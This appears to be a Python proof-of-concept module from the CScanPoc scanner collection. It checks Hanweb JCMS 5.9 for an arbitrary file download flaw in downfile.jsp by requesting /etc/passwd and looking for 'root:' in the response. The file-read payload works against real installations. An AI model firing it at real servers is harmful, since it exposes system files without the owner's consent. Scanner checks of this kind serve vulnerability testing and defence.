# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    poc_id = 'd986350a-1e67-42da-baff-41e83a7da048'
    name = '大汉JCMS内容管理系统 /jcms/m_5_9/sendreport/downfile.jsp 任意文件下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        大汉JCMS内容管理系统 /jcms/m_5_9/sendreport/downfile.jsp 任意文件下载漏洞
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '5.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e066e2ca-db42-4a03-a69a-ea8ee8621c5c'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ('/jcms/m_5_9/sendreport/downfile.jsp?filename=/etc/passwd&'
                                                  'savename=passwd.txt')
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "root:" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()